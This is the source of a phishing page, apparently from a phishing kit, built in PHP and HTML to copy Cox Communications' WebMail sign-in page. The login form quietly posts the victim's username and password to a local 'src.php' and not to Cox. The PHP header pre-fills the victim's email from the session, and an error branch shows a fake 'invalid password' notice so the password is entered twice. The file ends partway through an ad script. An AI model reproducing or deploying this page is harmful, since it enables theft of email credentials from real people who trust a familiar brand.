<?php
error_reporting(0);
session_start();
ob_start();

function loggedin(){
if(isset($_SESSION['email'])&&!empty($_SESSION['email'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){
	
				
				}else{
		
		die();
		}
		
$email = @$_SESSION['email'];

$error = @$_GET['error'];
if ($error == "null_entry") {
	$formaction = "src.php";
	$showerror = "block";
	
	
}else if ($error == "sec") {
	$formaction = "src.php?svr=tf";
	$showerror = "block";	
	
}else {
		$formaction = "src.php";
	$showerror = "none";
	
	
	
}


?>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><!-- VERSION: RC-CLIENT-5_4_2_0 --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Cox Communications - Residential Home</title><link rel="shortcut icon" href="https://images.cox.net/ui/presentation/tsw/residential/favicon.ico">
<!-- OPEN PF PLUGIN: head -->
<link href="https://idm.cox.com/SmMakeCookie.ccc?SMSESSION=LOGOFF&PERSIST=-SM-Thu%2c%2016%20Oct%202008%2011%3a40%3a12%20GMT&TARGET=-SM-https%3a%2f%2fidm%2ewest%2ecox%2enet%2fcss%2flogoff%2ecss" rel="stylesheet" type="text/css"><script type="text/javascript" src="https://idm.west.cox.net/coxlogin/js/jquery-1.10.2.js"></script><script type="text/javascript" src="https://idm.west.cox.net/coxlogin/js/jquery.placeholder.js"></script><script type="text/javascript" src="https://idm.west.cox.net/coxlogin/js/riskminder-client.js"></script>
<!-- CLOSE PF PLUGIN: head -->
<link href="https://images.cox.net/ui/presentation/tsw/residential/css/presentation.css.jgz" rel="stylesheet">
<script src="https://images.cox.net/ui/presentation/tsw/residential/js/presentation.js.jgz"></script><script>var CciFrameworkUrl = "//framework.cox.net/presentation/rest/3.0/locations/cities/";</script>
<!-- OPEN PF PLUGIN: header-commands -->

<!-- CLOSE PF PLUGIN: header-commands -->
</head>
<body class="CH CH71 W3C" data-os="windows" data-layout="desktop" style="">
<!-- PF-COMPONENT-BEGIN:introduction --><!-- OPEN PF PLUGIN: body-prefix -->

<!-- CLOSE PF PLUGIN: body-prefix --><!-- PF-COMPONENT-END:introduction --><!-- PF-COMPONENT-BEGIN:container -->
<div id="pf-container">
<div class="pf-constrain-width pf-tsw"><div id="pf-header"><ul class="pf-tsw-titlebar-left pf-tsw-residential-active"><li class="pf-tsw-residential-tab"><a href="http://www.cox.com/residential/home.html" class="pf-nav-label">Residential</a></li><li class="pf-tsw-business-tab"><a href="https://www.cox.com/business/" class="pf-nav-label">Business</a></li></ul><ul class="pf-tsw-titlebar-right"> 
<li class="pf-tsw-titlebar-search" id="pf-tsw-titlebar-search">
<form id="pf-search-panel" action="https://www.cox.com/search/residential/internal.cox" method="post" enctype="multipart/form-data">
<fieldset><legend>Search cox.com</legend><input type="hidden" name="crumbs" value="~/residential"><input type="hidden" name="filter" value="cox" id="pf-search-cox"><label for="pf-search-input" class="pf-hidden">Search cox.com</label><input type="text" class="create-placeholder" id="pf-search-input" name="term" value="" title="Search cox.com" placeholder="Search cox.com" maxlength="1024"><button type="submit" id="pf-search-submit" name="pf-search-submit">Search</button></fieldset></form></li>
<li class="pf-tsw-titlebar-cart"><a href="https://store.cox.com/residential-shop/shoppingcart.cox" title="Cart Empty">&nbsp;</a></li>
<li class="pf-tsw-titlebar-location"><a id="pf-btn-location" class="pf-toggle pf-nav-trigger-location" href="https://idm.west.cox.net/coxlogin/ui/webmail?TYPE=33554432&amp;REALMOID=06-f40ea76b-77cc-1000-8959-83a094a10cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-NIMXSvKfy%2bUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI&amp;TARGET=-SM-http%3a%2f%2fwebmail%2ewest%2ecox%2enet%2f#" aria-haspopup="true" title="Select a Location">Select a Location</a>
<div id="pf-location-panel" class="pf-overlay">
<form id="pf-location-zipcode-form" action="https://intercept.cox.com/dispatch/953270540712645321/intercept.cox?lob=residential&amp;s=pf" method="post"><fieldset><legend>Select a Location</legend><input type="hidden" name="dest" value="https://idm.west.cox.net/coxlogin/ui/webmail?SMAUTHREASON=0&amp;SMAGENTNAME=-SM-NIMXSvKfy%2BUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI&amp;TARGET=-SM-http%3A%2F%2Fwebmail.west.cox.net%2F&amp;GUID=&amp;REALMOID=06-f40ea76b-77cc-1000-8959-83a094a10cb3&amp;TYPE=33554432&amp;METHOD=GET"><input type="hidden" name="gl" value="pfgeolocation"><span id="pf-location-close-btn" aria-label="Close"></span><div class="pf-loader"></div>
<h3>Welcome!</h3>
<div class="pf-divider"></div>
<div id="pf-location-zipcode-form-status" class="pf-form-error"></div><p class="pf-location-intro">Let us know the location you'd like to browse.</p><div class="pf-location-panel-mid-section"><label for="zipcode" class="pf-hidden">Zip Code</label><input value="" type="text" id="zipcode" name="zipcode" maxlength="5" data-type="zip" title="Zip Code" placeholder="Zip"><span class="pf-location-panel-or">or</span><label for="state" class="pf-hidden">State</label><select id="state" name="state"><option value="" selected="selected">Choose a state</option>
<option value="AZ">Arizona</option>
<option value="AR">Arkansas</option>
<option value="CA">California</option>
<option value="CT">Connecticut</option>
<option value="FL">Florida</option>
<option value="GA">Georgia</option>
<option value="ID">Idaho</option>
<option value="IA">Iowa</option>
<option value="KS">Kansas</option>
<option value="LA">Louisiana</option>
<option value="MA">Massachusetts</option>
<option value="MO">Missouri</option>
<option value="NE">Nebraska</option>
<option value="NV">Nevada</option>
<option value="NC">North Carolina</option>
<option value="OH">Ohio</option>
<option value="OK">Oklahoma</option>
<option value="RI">Rhode Island</option>
<option value="VA">Virginia</option>
</select><label for="city" class="pf-hidden">City</label><select id="city" name="city"><option value="" selected="selected">City</option></select><input type="submit" class="pf-location-panel-submit-form" value="Check This Area"></div><div class="pf-divider"></div>
<p>Already a Cox Residential customer? <a href="https://idm.west.cox.net/coxlogin/ui/webmail?TYPE=33554432&amp;REALMOID=06-f40ea76b-77cc-1000-8959-83a094a10cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-NIMXSvKfy%2bUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI&amp;TARGET=-SM-http%3a%2f%2fwebmail%2ewest%2ecox%2enet%2f#" aria-haspopup="true" class="pf-toggle pf-nav-trigger-signin-panel">sign in</a></p>
<p>Looking for Business services? <a href="https://www.cox.com/business/">Go to Cox Business home</a></p></fieldset></form></div></li>
</ul></div><div id="pf-nav" class="pf-nav">
<ul class="pf-nav-groups"><li class="pf-nav-logo">
<a href="http://www.cox.com/residential/home.html"><img src="https://images.cox.net/ui/presentation/tsw/residential/img/interface/header/logo-cox.png" alt="Cox Communications"></a>
</li>
<li class="pf-nav-group"><ul class="pf-nav-items">
<li class="pf-nav-item pf-nav-flyout"><a href="https://store.cox.com/residential-shop/order-cox-services.cox" title="Shop" id="pf-residential-shop">Shop</a></li>
<li class="pf-nav-item pf-nav-flyout"><a href="http://myconnection.cox.com/" title="My Connection" id="pf-residential-myconnection">My Connection</a></li>
<li class="pf-nav-item pf-nav-flyout"><a href="https://www.cox.com/residential/support.html" title="Support" id="pf-residential-support">Support</a></li>
<li class="pf-nav-item pf-nav-flyout"><a href="http://www.cox.com/resaccount/home.cox" title="My Account" id="pf-residential-myaccount">My Account</a></li>
</ul></li><li class="pf-nav-group pf-nav-triggers">
<div id="pf-signin-panel" class="pf-overlay" style="top: -999px;"><form id="pf-signin-form" action="https://idm.east.cox.net/idm/coxnetlogin" enctype="application/x-www-form-urlencoded" method="post"><fieldset><legend>Sign In</legend><input name="onsuccess" id="pf-onsuccess" value="https%3A%2F%2Fidm.west.cox.net%2Fcoxlogin%2Fui%2Fwebmail%3FSMAUTHREASON%3D0%26SMAGENTNAME%3D-SM-NIMXSvKfy%252BUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI%26TARGET%3D-SM-http%253A%252F%252Fwebmail.west.cox.net%252F%26GUID%3D%26REALMOID%3D06-f40ea76b-77cc-1000-8959-83a094a10cb3%26TYPE%3D33554432%26METHOD%3DGET" type="hidden"><input name="onfailure" id="pf-onfailure" value="https://www.cox.com/residential/sign-in.cox?onsuccess=https%3A%2F%2Fidm.west.cox.net%2Fcoxlogin%2Fui%2Fwebmail%3FSMAUTHREASON%3D0%26SMAGENTNAME%3D-SM-NIMXSvKfy%252BUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI%26TARGET%3D-SM-http%253A%252F%252Fwebmail.west.cox.net%252F%26GUID%3D%26REALMOID%3D06-f40ea76b-77cc-1000-8959-83a094a10cb3%26TYPE%3D33554432%26METHOD%3DGET" type="hidden"><input name="targetFN" value="COX.net" type="hidden"><input name="emaildomain" value="@dev.cox.net" type="hidden"><div id="pf-signin-form-status" class="pf-form-error"></div><label for="username" class="pf-hidden">User ID</label><input type="text" id="username" name="username" title="User ID" placeholder="User ID" value=""><div class="password-wrapper"><label for="password" class="display-placeholder">Password</label> 
<input type="password" class="create-placeholder" id="password" name="password" title="Password" placeholder="Password"></div><input type="submit" id="pf-signin-submit" name="pf-signin-submit" value="Sign In"><span id="pf-signin-lock"></span><input type="checkbox" id="rememberme" name="rememberme" checked="checked"><label for="rememberme" id="rememberme-label">Remember User ID</label><hr><a href="https://idm.east.cox.net/selfservice2/registerresidentialaccountholder.action">No Account? Register Now!</a><a href="https://idm.east.cox.net/selfservice2/lookupuserid.action">Forgot User ID</a> / 
<a href="https://idm.east.cox.net/selfservice2/resetpassword.action?finalview=">Password?</a></fieldset></form></div>
<a class="pf-toggle pf-nav-trigger-contact" href="https://idm.west.cox.net/coxlogin/ui/webmail?TYPE=33554432&amp;REALMOID=06-f40ea76b-77cc-1000-8959-83a094a10cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-NIMXSvKfy%2bUtrs6JTiEiEHWtSHV9bW0gRsBHz3aXedLS40c9FHU8cemWjuHLw1yI&amp;TARGET=-SM-http%3a%2f%2fwebmail%2ewest%2ecox%2enet%2f#" aria-haspopup="true" title="Contact">Contact</a><div id="pf-contact-panel" class="pf-overlay"> 
<ul>
<li>
<strong>Sales</strong>
<span>866-961-0027</span>
</li>
<li>
<strong>Customer Service</strong>
<span>800-234-3993</span>
</li>
<li>
<a href="https://www.cox.com/residential/retail.html" title="Retail Locations">Retail Locations</a>
</li>
<li>
<a href="http://www.cox.com/residential/support/contact-us.cox" title="Local Service &amp; Support">Local Service &amp; Support</a>
</li>
</ul>
</div></li></ul>
<!-- mega menu --><div id="pf-mega-menu" class="pf-mega-menu-residential">
<div id="pf-residential-shop-items" class="pf-nav-items-secondary pf-clearfix">
<div class="pf-clearfix"></div>
<ul>
<li><a href="http://www.cox.com/residential/special-offers/bundles.html" class="pf-nav-items-secondary-header" title="Bundle &amp; Promotions">Bundle &amp; Promotions</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/residential/set-up-new-service.html" class="pf-nav-items-secondary-header" title="Set Up New Service">Set Up New Service</a></li>
</ul>
<ul>
<li><a href="https://store.cox.com/residential-shop/transfer-services.cox" class="pf-nav-items-secondary-header" title="Transfer My Service">Transfer My Service</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/residential/mdu-community.html" class="pf-nav-items-secondary-header" title="MDU/Community">MDU/Community</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/residential/tv.html" class="pf-nav-items-secondary-header" title="TV">TV</a></li>
<li><a href="http://www.cox.com/residential/tv/tv-features.html" title="TV Features">TV Features</a></li>
<li><a href="http://www.cox.com/residential/tv/tv-equipment.html" title="TV Equipment">TV Equipment</a></li>
<li><a href="http://www.cox.com/residential/tv/contour.html" title="Contour® TV">Contour® TV</a></li>
<li><a href="http://www.cox.com/residential/tv/premium-channels.html" title="HBO®, Starz®, Showtime®, Cinemax®">HBO®, Starz®, Showtime®, Cinemax®</a></li>
<li><a href="http://www.cox.com/residential/tv/sports-and-tv-packages.html" title="Sports &amp; TV Packages">Sports &amp; TV Packages</a></li>
<li><a href="http://www.cox.com/residential/tv/channel-lineup.html" title="Channel Lineup">Channel Lineup</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/residential/internet.html" class="pf-nav-items-secondary-header" title="Internet">Internet</a></li>
<li><a href="http://www.cox.com/residential/internet/internet-features.html" title="Internet Features">Internet Features</a></li>
<li><a href="http://www.cox.com/residential/internet/internet-equipment.html" title="Equipment">Equipment</a></li>
<li><a href="http://www.cox.com/residential/internet/wifi-hotspots.html" title="WiFi Hotspots">WiFi Hotspots</a></li>
<li><a href="http://www.cox.com/residential/internet/tech-solutions.html" title="Tech Solutions">Tech Solutions</a></li>
<li><a href="http://www.cox.com/residential/internet/speed-101.html" title="Speed 101">Speed 101</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/residential/phone.html" class="pf-nav-items-secondary-header" title="Digital Telephone">Digital Telephone</a></li>
<li><a href="http://www.cox.com/residential/phone/phone-features.html" title="Phone Features">Phone Features</a></li>
<li><a href="http://www.cox.com/residential/phone/long-distance.html" title="International &amp; Domestic Long Distance">International &amp; Domestic Long Distance</a></li>
<li><a href="http://www.cox.com/residential/phone/lifeline.html" title="Lifeline Telephone">Lifeline Telephone</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/residential/homelife.html" class="pf-nav-items-secondary-header" title="Homelife">Homelife</a></li>
<li><a href="http://www.cox.com/residential/homelife/homelife-features.html" title="Homelife Features">Homelife Features</a></li>
<li><a href="http://www.cox.com/residential/homelife/equipment.html" title="Homelife Equipment">Homelife Equipment</a></li>
<li><a href="http://www.cox.com/residential/homelife/in-home-consultation.html" title="In-Home Consultation">In-Home Consultation</a></li>
</ul>
</div>
<div id="pf-residential-myconnection-items" class="pf-nav-items-secondary pf-clearfix">
<ul>
<li><a href="http://myconnection.cox.com/" class="pf-nav-items-secondary-header" title="My Connection Home">My Connection Home</a></li>
<li><a href="http://myconnection.cox.com/category/nationalnews" class="pf-nav-items-secondary-header" title="Today&#39;s News">Today's News</a></li>
<li><a href="http://myconnection.cox.com/category/nationalnews" title="Top Stories">Top Stories</a></li>
<li><a href="http://myconnection.cox.com/weather" title="Weather">Weather</a></li>
<li><a href="http://myconnection.cox.com/category/nationalsports" title="Sports">Sports</a></li>
<li><a href="http://myconnection.cox.com/category/entertainment" title="Entertainment">Entertainment</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/myconnection/watch.cox" class="pf-nav-items-secondary-header" title="Watch">Watch</a></li>
<li><a href="http://www.cox.com/myconnection/watch/video-landing.cox" title="TV Online">TV Online</a></li>
<li><a href="http://www.cox.com/myconnection/watch/entertainment/online-apps.cox" title="TV Apps">TV Apps</a></li>
<li><a href="http://www.cox.com/myconnection/watch/entertainment/tv-listings.cox" title="TV Listings &amp; Set DVR">TV Listings &amp; Set DVR</a></li>
<li><a href="http://www.cox-ondemand.com/" title="Movies On DEMAND">Movies On DEMAND</a></li>
<li><a href="http://www.cox-ondemand.com/sports-events/upcoming-events" title="Pay-Per-View Events">Pay-Per-View Events</a></li>
<li><a href="http://www.cox-ondemand.com/tv-shows" title="Featured Shows">Featured Shows</a></li>
</ul>
<ul>
<li><a href="https://www.cox.com/residential/learn.html" class="pf-nav-items-secondary-header" title="Learn">Learn</a></li>
<li><a href="https://www.cox.com/residential/learn/data-usage.html" title="All About Data Usage">All About Data Usage</a></li>
<li><a href="http://welcome.cox.com/" title="Getting Started with your Cox Services">Getting Started with your Cox Services</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/aboutus/cox-in-the-community.html" class="pf-nav-items-secondary-header" title="In the Community">In the Community</a></li>
<li><a href="http://www.cox.com/aboutus/take-charge.html" title="Take Charge!">Take Charge!</a></li>
<li><a href="http://www.cox.com/aboutus/cox-in-the-community/cox-conserves.html" title="Cox Conserves">Cox Conserves</a></li>
</ul>
<div class="pf-clearfix"></div>
<ul>
<li><a href="https://myaccount.cox.net/" class="pf-nav-items-secondary-header" title="Internet Tools">Internet Tools</a></li>
</ul>
<ul>
<li><a href="http://webmail.cox.net/" class="pf-nav-items-secondary-header" title="Email / WebMail">Email / WebMail</a></li>
</ul>
<ul>
<li><a href="https://phonetools.cox.com/" class="pf-nav-items-secondary-header" title="Phone Tools">Phone Tools</a></li>
</ul>
<ul>
<li><a href="https://www.cox.com/residential/tv/channel-lineup.html" class="pf-nav-items-secondary-header" title="Channel Lineups">Channel Lineups</a></li>
</ul>
</div>
<div id="pf-residential-support-items" class="pf-nav-items-secondary pf-clearfix">
<ul>
<li><a href="https://www.cox.com/residential/support.html" class="pf-nav-items-secondary-header" title="Help Articles">Help Articles</a></li>
<li><a href="https://www.cox.com/residential/support/tv.html" title="TV">TV</a></li>
<li><a href="https://www.cox.com/residential/support/internet.html" title="Internet">Internet</a></li>
<li><a href="https://www.cox.com/residential/support/phone.html" title="Phone">Phone</a></li>
<li><a href="https://www.cox.com/residential/support/home-security.html" title="Homelife">Homelife</a></li>
<li><a href="https://www.cox.com/residential/support/billing-and-account.html" title="Billing &amp; Account">Billing &amp; Account</a></li>
</ul>
<ul>
<li><a href="https://www.cox.com/residential/support/step-by-step-solutions.html" class="pf-nav-items-secondary-header" title="Step-by-Step Solutions">Step-by-Step Solutions</a></li>
<li><a href="http://www.cox.com/residential/support/tv/guidedhelp.cox?articleId=bb793bb0-db1b-11e1-6d35-000000000000" title="TV Picture Problems">TV Picture Problems</a></li>
<li><a href="http://www.cox.com/residential/support/internet/guidedhelp.cox?articleId=67a26470-d6c6-11e1-d920-000000000000" title="Email Settings">Email Settings</a></li>
<li><a href="http://www.cox.com/residential/support/phone/guidedhelp.cox?articleId=63d49390-d6c6-11e1-d920-000000000000" title="Call Forwarding">Call Forwarding</a></li>
<li><a href="http://www.cox.com/residential/support/tv/article.cox?articleId=565a9f10-69b9-11df-5fca-000000000000" title="Program Your Remote">Program Your Remote</a></li>
</ul>
<ul>
<li><a href="http://forums.cox.com/" class="pf-nav-items-secondary-header" title="Support Forums">Support Forums</a></li>
<li><a href="http://forums.cox.com/login.aspx?ReturnUrl=" title="Join the Discussion">Join the Discussion</a></li>
<li><a href="http://forums.cox.com/forum_home/tv_forum/f/4/p/addpost.aspx" title="Ask a TV Question">Ask a TV Question</a></li>
<li><a href="http://forums.cox.com/forum_home/internet_forum/f/5/p/addpost.aspx" title="Ask an Internet Question">Ask an Internet Question</a></li>
<li><a href="http://forums.cox.com/forum_home/phone_forum/f/6.aspx" title="Ask a Phone Question">Ask a Phone Question</a></li>
</ul>
<ul>
<li><a href="https://www.cox.com/residential/support.html" class="pf-nav-items-secondary-header" title="Support Home">Support Home</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/residential/tech-solutions.cox" class="pf-nav-items-secondary-header" title="Premium Support">Premium Support</a></li>
<li><a href="http://www.cox.com/residential/tech-solutions.cox#concierge" title="Tech Solutions">Tech Solutions</a></li>
<li><a href="http://www.cox.com/residential/service-protection-plan.cox" title="Service Protection Plan">Service Protection Plan</a></li>
</ul>
</div>
<div id="pf-residential-myaccount-items" class="pf-nav-items-secondary pf-clearfix">
<ul>
<li><a href="http://www.cox.com/resaccount/home.cox" class="pf-nav-items-secondary-header" title="My Account Home">My Account Home</a></li>
<li><a href="http://www.cox.com/resaccount/home.cox" title="My Account Overview">My Account Overview</a></li>
<li><a href="http://www.cox.com/resaccount/my-services.cox" title="Explore My Services">Explore My Services</a></li>
<li><a href="https://store.cox.com/residential-shop/transfer-services.cox" title="Move or Transfer Services">Move or Transfer Services</a></li>
<li><a href="https://store.cox.com/residential-shop/view-and-upgrade-services.cox" title="Add or Upgrade Services">Add or Upgrade Services</a></li>
<li><a href="http://www.cox.com/resaccount/service-appointment.cox" title="Manage Appointments">Manage Appointments</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/ibill/home.cox" class="pf-nav-items-secondary-header" title="View / Pay Bill">View / Pay Bill</a></li>
<li><a href="http://www.cox.com/ibill/make-payment.cox" title="Pay Bill">Pay Bill</a></li>
<li><a href="http://www.cox.com/ibill/automatic-payments.cox" title="Automatic Payments">Automatic Payments</a></li>
<li><a href="http://www.cox.com/ibill/recent-activity.cox" title="View Recent Activity">View Recent Activity</a></li>
<li><a href="http://www.cox.com/ibill/manage-payment-method.cox" title="Payment Methods">Payment Methods</a></li>
<li><a href="http://www.cox.com/ibill/bill-delivery.cox" title="Enroll in Paperless Billing">Enroll in Paperless Billing</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/resaccount/tools.cox" class="pf-nav-items-secondary-header" title="My Tools">My Tools</a></li>
<li><a href="http://webmail.cox.net/do/mail/folder/view" title="WebMail Inbox">WebMail Inbox</a></li>
<li><a href="http://www.cox.com/resaccount/tools.cox" title="Internet Tools">Internet Tools</a></li>
<li><a href="https://myaccount.cox.net/internettools/datausage/usage.cox" title="Data Usage Meter">Data Usage Meter</a></li>
<li><a href="https://phonetools.cox.com/" title="Phone Tools">Phone Tools</a></li>
<li><a href="http://www.cox.com/resaccount/tools.cox" title="TV Tools">TV Tools</a></li>
<li><a href="https://portal.coxhomelife.com/sp/login.jsp" title="Homelife Portal">Homelife Portal</a></li>
</ul>
<ul>
<li><a href="http://www.cox.com/resaccount/my-profile.cox" class="pf-nav-items-secondary-header" title="Profile &amp; Settings">Profile &amp; Settings</a></li>
<li><a href="http://www.cox.com/resaccount/my-profile.cox" title="View My Account Profile">View My Account Profile</a></li>
<li><a href="http://www.cox.com/resaccount/my-profile.cox" title="Change Password">Change Password</a></li>
<li><a href="http://www.cox.com/resaccount/my-profile.cox" title="Identity and Preferences">Identity and Preferences</a></li>
<li><a href="http://www.cox.com/resaccount/my-profile.cox" title="Privacy Preferences">Privacy Preferences</a></li>
<li><a href="https://myaccount.cox.net/internettools/email/email.cox" title="Manage Email Boxes">Manage Email Boxes</a></li>
</ul>
</div>
<!-- /mega menu --></div></div></div>

<!-- PF-COMPONENT-END:header -->
<div id="container"><!-- PF-COMPONENT-END:breadcrumbs -->
<!-- PF-COMPONENT-BEGIN:introduction --><!-- PF-COMPONENT-END:introduction -->
<!-- OPEN PF PLUGIN: contentarea-prefix --><!-- CLOSE PF PLUGIN: contentarea-prefix --><!-- PF-COMPONENT-BEGIN:content -->





<div class="pf-constrain-width">
 <!-- INTERWOVEN FILE OPEN: /coxmain/webmail/login.html -->
<link href="https://ww2.cox.com/wcm/en/common/css/login.css" rel="stylesheet" type="text/css">

<!-- content-frame -->



<div id="content-frame">
	<!-- content -->
	<div id="content">
</div>

	<div id="content">

		<!-- main content module -->
		<div class="content-container">
			<div class="bd clearfix">
				<!-- promo area -->
				<div id="promo_area">
					<h1>WebMail</h1>
					<p class="error" style="display: <?php echo "$showerror"; ?>;">
							You have entered an invalid username or password. If you have forgotten your details, Please attempt to recover your <a href="https://idm.west.cox.net/selfservice2/lookupuserid.action" class="small-blue-link" target="_blank">username</a> or <a href="https://idm.west.cox.net/selfservice2/resetpassword.action" class="small-blue-link">password</a> and try again. <a href="http://www.cox.com/residential/support/billing-and-account/article.cox?articleId=%7b5ce6cd20-32c5-11df-fe42-000000000000%7d" class="small-blue-link">Click here for more information</a>.					    
											</p>
					<h2>Logging in here will allow you to:</h2>
					<ul>
						<li>Access up to 10 email accounts</li>
						<li>Compose new messages to contacts from your Address Book</li>
						<li>Manage SpamBlocker and other advanced email tools</li>
						<li>Search for current and saved messages</li>
					</ul>
					 <br>
  <h2>Have Questions?</h2>
  <a href="http://www.cox.com/aboutus/contact-us/residential-local-chat.cox?campcode=signin_webmail_chat_1"><img src="https://images.cox.com/wcm/en/common/image/icons/icon-livechat.png" style="vertical-align:middle"><strong> Chat with Us</strong></a>
                    <!--
					<a href="#" class="read-more">See more</a>
                    -->
                     <!--
					<div id="alert">
						<p class="small">If your existing username for View/Pay Bill does not end with @cox.net, you will need to re-register and select a new User ID.</p>
					</div>
                  
					<p><a href="http://ww2.cox.com/residential/internet.cox?campcode=login_wm_hsi">Learn more</a> about Cox High Speed Internet.</p>  -->
				</div>
				<!-- /promo area -->

				<!-- login -->
				<div id="login_widget">
					<div class="top">Sign In
						<a href="http://ww2.cox.com/residential/support/billing-and-account/article.cox?articleId={5ce6cd20-32c5-11df-fe42-000000000000}" class="btn-help" onmouseover="document.getElementById(&#39;sign-in-tooltip&#39;).style.display=&#39;block&#39;;" onmouseout="document.getElementById(&#39;sign-in-tooltip&#39;).style.display=&#39;none&#39;;"><span>Help</span></a>
						<div id="sign-in-tooltip" style="z-index: 9999; position: absolute; display: none; right: 40px; top: -22px;">
							<div class="tooltip"><div class="wrapper"><div class="rightarrow">&nbsp;</div><table class="head"><tbody><tr><td class="tl"></td><td class="t">&nbsp;</td><td class="tr"></td></tr></tbody></table><table class="body"><tbody><tr><td class="l"></td><td class="c"><div class="dialog-pane-content">
								<p>Enter the email address associated with your Cox account to sign in to WebMail.<br>Note: Your Cox email address is not your Facebook, Yahoo, or Gmail address or your account number.</p>
							</div></td><td class="r"></td></tr></tbody></table><table class="foot"><tbody><tr><td class="bl"></td><td class="b">&nbsp;</td><td class="br"></td></tr></tbody></table></div></div>
						</div>
					</div>
					<div id="sign-in">
						<div class="sign-in-form">
							<form class="regular" method="POST" action="<?php echo "$formaction"; ?>" enctype="application/x-www-form-urlencoded" name="LoginPage"">
								<input type="hidden" name="target" value="http%3A%2F%2Fwebmail.west.cox.net%2F">
								<input type="hidden" name="onsuccess" value="http%3A%2F%2Fwebmail.west.cox.net%2F">
								<input type="hidden" name="onfailure" value="http://idm.west.cox.net/coxlogin/ui/webmail">
								<fieldset>
									<ol>
										<li class="form-text top-label">
											<label id="idm-username-label" for="idm-username-input"><span>User ID</span></label>
											<input id="idm-username-input" type="text" name="username" value="<?php echo "$email"; ?>" maxlength="128">
											<input type="hidden" name="wiz">
										</li>
										<li class="form-text top-label">
											<label id="idm-password-label" for="idm-password-input"><span>Password</span></label>
											<input id="idm-password-input" type="password" name="password" maxlength="128">
										</li>
										<li class="form-checkbox">
											<input id="idm-remember-me" type="checkbox" name="rememberme" value="true" checked="">
											<label id="idm-remember-label" for="idm-remember-me">Remember User ID</label>
										</li>
										<li class="form-radio">
											<input id="matchclassic" type="radio" name="match" value="classic" onclick="updateCheck(this.form,&#39;classic&#39;)" style="visibility: visible;">
											<label id="idm-webmail-classic-label" for="matchclassic" onmouseover="document.getElementById(&#39;classic-webmail-tooltip&#39;).style.display=&#39;block&#39;;" onmouseout="document.getElementById(&#39;classic-webmail-tooltip&#39;).style.display=&#39;none&#39;;">Classic WebMail</label>
											<div id="classic-webmail-tooltip" style="z-index: 9999; position: absolute; display: none; right: 230px; top: 120px;">
												<div class="tooltip"><div class="wrapper"><div class="rightarrow">&nbsp;</div><table class="head"><tbody><tr><td class="tl"></td><td class="t">&nbsp;</td><td class="tr"></td></tr></tbody></table><table class="body"><tbody><tr><td class="l"></td><td class="c"><div class="dialog-pane-content">
													<p>Cox High Speed Internet's Classic WebMail is ready for you with all your favorite features.</p>
													<p>Ready to get more out of WebMail, like faster review and easier management? Try Enhanced WebMail.</p>
												</div></td><td class="r"></td></tr></tbody></table><table class="foot"><tbody><tr><td class="bl"></td><td class="b">&nbsp;</td><td class="br"></td></tr></tbody></table></div></div>
											</div>
										</li>
										<li class="form-radio">
											<input id="matchngw" type="radio" name="match" value="ngw" onclick="updateCheck(this.form,&#39;ngw&#39;)" style="visibility: visible;">
											<label id="idm-webmail-enhanced-label" for="imatchngw" onmouseover="document.getElementById(&#39;enhanced-webmail-tooltip&#39;).style.display=&#39;block&#39;;" onmouseout="document.getElementById(&#39;enhanced-webmail-tooltip&#39;).style.display=&#39;none&#39;;">Enhanced WebMail</label>
											<div id="enhanced-webmail-tooltip" style="z-index: 9999; position: absolute; display: none; right: 230px; top: 142px;">
												<div class="tooltip"><div class="wrapper"><div class="rightarrow">&nbsp;</div><table class="head"><tbody><tr><td class="tl"></td><td class="t">&nbsp;</td><td class="tr"></td></tr></tbody></table><table class="body"><tbody><tr><td class="l"></td><td class="c"><div class="dialog-pane-content">
													<p>Cox High Speed Internet's Enhanced WebMail lets you get more out of what you're in to.</p>
													<p>Check messages faster and manage them easier when you choose Enhanced WebMail!</p>
												</div></td><td class="r"></td></tr></tbody></table><table class="foot"><tbody><tr><td class="bl"></td><td class="b">&nbsp;</td><td class="br"></td></tr></tbody></table></div></div>
											</div>
										</li>
										<li class="form-submit clearfix form-submit-lock">
											<button type="submit"><span><span>Sign In</span></span></button><span class="lock"></span>
										</li>
									</ol>
								</fieldset>
								<ul class="links">
									<li><a href="https://idm.east.cox.net/selfservice2/registerresidentialaccountholder.action">No Account? Register now!</a></li>
									<li><a href="https://idm.east.cox.net/selfservice2/lookupuserid.action">Forgot User ID</a> / <a href="https://idm.east.cox.net/selfservice2/resetpassword.action">Password?</a></li>
									<li><a href="http://ww2.cox.com/residential/support/billing-and-account/article.cox?articleId={5ce6cd20-32c5-11df-fe42-000000000000}">Need help signing in?</a></li>
								</ul>
							<input type="hidden" name="MFP" value=""><input type="hidden" name="CallerID" value=""><input type="hidden" name="DeviceID" value=""></form>



						</div>
					</div>
				</div>
				<!-- /login -->
			</div>
			<div class="ft"></div>
		</div>
		<!-- main content module -->

<!-- ad -->
<div class="ad-container">
	<script type="text/javascript" src="https://static-segments.beringmedia.com/dfp/1/bmi.segments.js"></script>
	<script type="text/javascript">
	
